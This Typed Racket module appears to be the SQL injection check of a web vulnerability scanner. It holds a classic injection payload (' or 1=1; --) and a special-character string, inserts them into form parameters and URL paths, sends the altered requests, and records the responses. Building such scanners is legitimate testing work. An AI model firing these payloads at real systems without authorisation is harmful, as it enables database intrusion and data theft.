#lang typed/racket

(provide attack)

(require "../http/request.rkt"
         "../http/types.rkt"
         (prefix-in payloadize: "payloadize.rkt"))

(: payloads (Listof Bytes))
(define payloads
  '(#"' or 1=1; --"
    #"~!@#$%^`&*()_+-={}|[]\\;?><,./\""))

(: payload->path/param (-> Bytes path/param path/param))
(define (payload->path/param payload element)
  (struct-copy path/param
               element
               (path (bytes->string/utf-8 payload))))

(: payload->param (-> Bytes param param))
(define (payload->param payload element)
  (struct-copy param
               element
               (value payload)))

(: attack (-> request (Listof request-response)))
(define (attack req)
  (map
   (lambda ((req : request)) : request-response
     (request-response req
                       (send req)
                       'sqli))
   (append (payloadize:form-params payload->param req payloads)
           (payloadize:url-paths payload->path/param req payloads))))
